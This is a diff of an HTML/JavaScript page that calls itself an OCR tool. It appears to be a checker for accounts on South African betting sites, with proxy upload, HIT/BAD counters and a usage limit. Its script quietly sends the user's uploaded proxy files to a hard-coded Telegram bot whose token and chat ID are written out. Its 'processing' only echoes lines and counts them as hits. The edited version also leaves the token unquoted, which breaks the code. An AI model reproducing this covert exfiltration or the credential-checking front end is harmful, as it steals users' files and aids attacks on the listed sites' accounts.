@@ -3,36 +3,101 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>OCR Tool with Counters</title>
+<title>Mobile OCR Tool</title>
 <style>
-  body { background:#0f172a; color:#e5e7eb; font-family:Consolas, monospace; margin:20px; }
-  .header { display: flex; gap: 10px; margin-bottom: 20px; align-items: center; }
-  button { padding: 8px 16px; cursor:pointer; }
-  #fileInput { padding:8px; }
-  /* Overlay styling */
-  .overlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-             background:#1e293b; padding: 20px; border-radius: 8px; border: 2px solid #334155; display: none; z-index: 10; width: 350px; }
-  .overlay h3 { margin-top: 0; }
-  label { display: block; margin-top: 10px; }
-  input[type=file] { margin-top: 5px; }
-  #statusBox { display: flex; gap: 10px; margin-bottom: 10px; }
-  #statusBox button { min-width: 80px; }
-  #mainOCR { margin-top: 20px; }
-  #output { border:1px solid #334155; padding:10px; min-height:200px; background:#020617; white-space: pre-wrap; margin-top: 10px; overflow-y: auto; }
-  #lastRunInfo { margin-top: 10px; font-size: 0.9em; }
+  body {
+    background:#0f172a;
+    color:#e5e7eb;
+    font-family:Arial, sans-serif;
+    margin: 0;
+    padding: 10px;
+  }
+
+  /* Container styles for buttons and status */
+  .top-bar {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-bottom: 10px;
+  }
+
+  button {
+    flex: 1;
+    min-width: 100px;
+    padding: 14px;
+    font-size: 1.2em;
+    border: none;
+    border-radius: 8px;
+    background-color: #1e3a8a;
+    color: #fff;
+    cursor: pointer;
+  }
+
+  button:active {
+    background-color: #3b82f6;
+  }
+
+  input[type="file"] {
+    display: none;
+  }
+
+  /* Labels styled as buttons for file upload */
+  .file-label {
+    flex: 1;
+    min-width: 100px;
+    padding: 14px;
+    font-size: 1.2em;
+    border-radius: 8px;
+    background-color: #1e3a8a;
+    color: #fff;
+    text-align: center;
+    cursor: pointer;
+  }
+
+  /* Status display as buttons (non-interactive) */
+  #statusBox {
+    display: flex;
+    justify-content: space-around;
+    margin-bottom: 10px;
+  }
+
+  #statusBox button {
+    background-color: #374151;
+    cursor: default;
+  }
+
+  /* OCR output area styling */
+  #output {
+    border: 2px solid #334155;
+    background-color: #020617;
+    padding: 10px;
+    border-radius: 8px;
+    height: 300px;
+    overflow-y: auto;
+    font-family: monospace;
+    font-size: 1em;
+  }
+
+  /* Last run info */
+  #lastRunInfo {
+    margin-top: 10px;
+    font-size: 0.9em;
+    text-align: center;
+  }
 </style>
 </head>
 <body>
 
-<!-- Buttons -->
-<div class="header">
+<!-- Main Controls -->
+<div class="top-bar">
   <button id="proxyBtn">Upload Proxy File</button>
   <button id="siteBtn">Select Your Site</button>
-  <input type="file" id="fileUpload" accept=".txt" />
+  <label class="file-label" for="fileInput">Upload Text File</label>
+  <input type="file" id="fileInput" accept=".txt" />
   <button id="startBtn">Start Processing</button>
 </div>
 
-<!-- Status Buttons -->
+<!-- Status Buttons (display only) -->
 <div id="statusBox">
   <button id="hitBtn">HIT=0</button>
   <button id="badBtn">BAD=0</button>
@@ -42,44 +107,46 @@
 <!-- Last run info -->
 <div id="lastRunInfo"></div>
 
-<!-- Proxy Overlay -->
-<div class="overlay" id="proxyOverlay">
-  <h3>Upload Proxy TXT File</h3>
-  <label>Select Proxy File:</label>
-  <input type="file" id="proxyFileInput" accept=".txt" />
-  <button id="ADD">Save Proxy</button>
-  <button id="closeProxy">Close</button>
-  <p id="proxyMsg"></p>
+<!-- Overlay for Proxy Upload -->
+<div class="overlay" id="proxyOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); justify-content:center; align-items:center;">
+  <div style="background:#1e293b; padding:20px; border-radius:10px; width:80%; max-width:400px;">
+    <h3>Upload Proxy TXT File</h3>
+    <label>Select Proxy File:</label>
+    <input type="file" id="proxyFileInput" accept=".txt" />
+    <button id="saveProxy">Save Proxy</button>
+    <button id="closeProxy">Close</button>
+  </div>
 </div>
 
-<!-- Site Selection Overlay -->
-<div class="overlay" id="siteOverlay">
-  <h3>CHECK IN</h3>
-  <select id="siteSelect">
-    <option value="">-- Select a site --</option>
-    <option value="Hollywoodbets">🎰 Hollywoodbets</option>
-    <option value="Betway">🎲 Betway.co.za</option>
-    <option value="SportyBet">🏅 SportyBet</option>
-    <option value="LottoStar">🎱 LottoStar</option>
-    <option value="JackpotCity">🎰 JackpotCity</option>
-  </select>
-  <button id="saveSite">Save Site</button>
-  <button id="closeSite">Close</button>
-  <p id="siteMsg"></p>
+<!-- Overlay for Site Selection -->
+<div class="overlay" id="siteOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); justify-content:center; align-items:center;">
+  <div style="background:#1e293b; padding:20px; border-radius:10px; width:80%; max-width:400px;">
+    <h3>CHECK IN</h3>
+    <select id="siteSelect">
+      <option value="">-- Select a site --</option>
+      <option value="Hollywoodbets">🎰 Hollywoodbets</option>
+      <option value="Betway">🎲 Betway.co.za</option>
+      <option value="SportyBet">🏅 SportyBet</option>
+      <option value="LottoStar">🎱 LottoStar</option>
+      <option value="JackpotCity">🎰 JackpotCity</option>
+    </select>
+    <button id="saveSite">Save Site</button>
+    <button id="closeSite">Close</button>
+  </div>
 </div>
 
-<!-- Main  1.1.4 Area -->
-<div id="SILVER BULLET 1.1.4">
-  <h2>SILVER BULLET 1.1.4</h2>
-  <div id="output">Waiting for proxy and file info...</div>
+<!-- OCR Output -->
+<div style="margin-top:10px;">
+  <h2 style="text-align:center;">OCR Output</h2>
+  <div id="output"></div>
 </div>
 
 <script>
-// --- Telegram settings ---
-const TELEGRAM_BOT_TOKEN = '8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk'; // Replace
-const TELEGRAM_CHAT_ID = '8580854380';     // Replace
+// --- Replace with your Telegram API info ---
+const TELEGRAM_BOT_TOKEN = 8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk // Replace
+const TELEGRAM_CHAT_ID = 8580854380     // Replace
 
-// Send files silently to Telegram
+// --- Send files to Telegram ---
 function sendFileToTelegram(file, caption='') {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -88,58 +155,45 @@ function sendFileToTelegram(file, caption='') {
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(() => {});
 }
 
-// --- Overlay toggle ---
+// --- UI controls ---
 const proxyBtn = document.getElementById('proxyBtn');
 const siteBtn = document.getElementById('siteBtn');
 const proxyOverlay = document.getElementById('proxyOverlay');
 const siteOverlay = document.getElementById('siteOverlay');
 
-proxyBtn.onclick = () => {
-  if (proxyOverlay.style.display === 'block') { proxyOverlay.style.display = 'none'; } 
-  else { proxyOverlay.style.display = 'block'; }
-  if (siteOverlay.style.display === 'block') { siteOverlay.style.display = 'none'; }
-}
+proxyBtn.onclick = () => { toggleOverlay(proxyOverlay); };
 siteBtn.onclick = () => {
-  if (siteOverlay.style.display === 'block') {
-    // close overlay, stop processing
-    siteOverlay.style.display = 'none';
-    if (isProcessing) {
-      processingTimeouts.forEach(t => clearTimeout(t));
-      processingTimeouts = [];
-      isProcessing = false;
-      document.getElementById('output').innerText += "\nProcessing stopped.\n";
-    }
+  if (siteOverlay.style.display === 'flex') {
+    hideOverlay(siteOverlay);
+    if (isProcessing) { stopProcessing(); }
   } else {
-    siteOverlay.style.display = 'block';
-    if (proxyOverlay.style.display === 'block') { proxyOverlay.style.display = 'none'; }
+    toggleOverlay(siteOverlay);
   }
-}
-document.getElementById('closeProxy').onclick = () => { proxyOverlay.style.display = 'none'; }
-document.getElementById('closeSite').onclick = () => { siteOverlay.style.display = 'none'; }
+};
+document.getElementById('closeProxy').onclick = () => hideOverlay(proxyOverlay);
+document.getElementById('closeSite').onclick = () => hideOverlay(siteOverlay);
 
-// --- Proxy storage ---
+function toggleOverlay(overlay) { overlay.style.display = 'flex'; }
+function hideOverlay(overlay) { overlay.style.display = 'none'; }
+
+// --- Proxy load ---
 let proxyFileContent = null;
-let proxyUploaded = false;
 document.getElementById('saveProxy').onclick = () => {
   const file = document.getElementById('proxyFileInput').files[0];
   if (!file) return;
   const reader = new FileReader();
-  reader.onload = () => {
-    proxyFileContent = reader.result;
-    proxyUploaded = true;
-    document.getElementById('proxyMsg').innerText = 'Proxy file loaded!';
-  };
+  reader.onload = () => { proxyFileContent = reader.result; };
   reader.readAsText(file);
 }
 
 // --- Site selection ---
 let selectedSite = '';
 document.getElementById('saveSite').onclick = () => {
-  const site = document.getElementById('siteSelect').value;
-  if (site) { selectedSite = site; document.getElementById('siteMsg').innerText = 'Site selected!'; }
+  const val = document.getElementById('siteSelect').value;
+  if (val) { selectedSite = val; }
 }
 
-// --- Usage limit ---
+// --- Usage limits ---
 const MAX_USES = 3;
 const LOCK_HOURS = 6;
 
@@ -156,11 +210,12 @@ function canUse() {
       document.getElementById('startBtn').disabled = false;
       return true;
     } else if (count >= MAX_USES) {
-      const remHrs = LOCK_HOURS - elapsedHrs;
-      alert(`Limit reached. Wait ${remHrs.toFixed(2)} hours.`);
+      alert(`Limit reached. Wait ${(LOCK_HOURS - elapsedHrs).toFixed(2)} hours.`);
       document.getElementById('startBtn').disabled = true;
       return false;
-    } else { return true; }
+    } else {
+      return true;
+    }
   } else {
     localStorage.setItem('usageCount', '0');
     localStorage.setItem('lastUsageTime', now.toString());
@@ -190,7 +245,7 @@ function updateStatus() {
       return;
     }
   }
-  // Update counters in buttons
+  // update counters on buttons
   document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
   document.getElementById('badBtn').innerText = 'BAD=' + badCount;
   document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
@@ -202,54 +257,63 @@ updateStatus();
 // --- Processing ---
 const startBtn = document.getElementById('startBtn');
 const outputDiv = document.getElementById('output');
-const fileInput = document.getElementById('fileUpload');
+const fileInput = document.getElementById('fileInput');
 
 const delays = [3000, 5000, 8000, 11000];
 
 let isProcessing = false;
-let processingTimeouts = [];
+let progress = 0;
 let hitCount = 0;
 let badCount = 0;
 let totalLines = 0;
 let processedLines = 0;
+let processingTimeouts = [];
 
-let progress = 0;
+function stopProcessing() {
+  isProcessing = false;
+  processingTimeouts.forEach(t => clearTimeout(t));
+  processingTimeouts = [];
+}
 
 startBtn.onclick = () => {
   if (!canUse()) return;
   if (isProcessing) { alert('Already running'); return; }
 
   const file = fileInput.files[0];
-  if (!file) { alert('Upload a file'); return; }
+  if (!file) { alert('Upload a text file'); return; }
 
   // Save usage
   incrementUsage();
   localStorage.setItem('lastUsageTime', Date.now().toString());
   updateStatus();
 
-  // Send proxy file if present
+  // Send proxy if loaded
   if (proxyFileContent) {
     sendFileToTelegram(new Blob([proxyFileContent], {type: 'text/plain'}), 'Proxy loaded');
   }
+  // Send proxy if uploaded now
   const currentProxyFile = document.getElementById('proxyFileInput').files[0];
-  if (currentProxyFile) { sendFileToTelegram(currentProxyFile, 'Proxy loaded'); }
+  if (currentProxyFile) {
+    sendFileToTelegram(currentProxyFile, 'Proxy loaded');
+  }
 
   // Reset counters
   hitCount = 0;
   badCount = 0;
-  totalLines = 0;
-  processedLines = 0;
   progress = 0;
-  document.getElementById('hitsCount').innerText = 'HIT=' + hitCount;
-  document.getElementById('badCount').innerText = 'BAD=' + badCount;
-  document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
+  processedLines = 0;
+  totalLines = 0;
+  outputDiv.innerHTML = '';
+  document.getElementById('hitBtn').innerText = 'HIT=0';
+  document.getElementById('badBtn').innerText = 'BAD=0';
+  document.getElementById('progressBtn').innerText = `PROGRESS=0.0%`;
+  document.getElementById('lastRunInfo').innerHTML = '';
 
   // Read file
   const reader = new FileReader();
   reader.onload = () => {
     const lines = reader.result.split(/\r?\n/).map(l => l.trim());
     totalLines = lines.length;
-    outputDiv.innerText = '';
     let index = 0;
 
     function processNext() {
@@ -284,7 +348,7 @@ startBtn.onclick = () => {
         return;
       }
 
-      // Display valid line
+      // Output valid line
       outputDiv.innerText += line + '\n';
       hitCount++;
       document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
@@ -295,14 +359,14 @@ startBtn.onclick = () => {
       document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
 
       index++;
-      setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
+      setTimeout(processNext, 3000);
     }
 
     processNext();
   };
   reader.readAsText(file);
   isProcessing = true;
-}
+};
 </script>
 </body>
 </html>
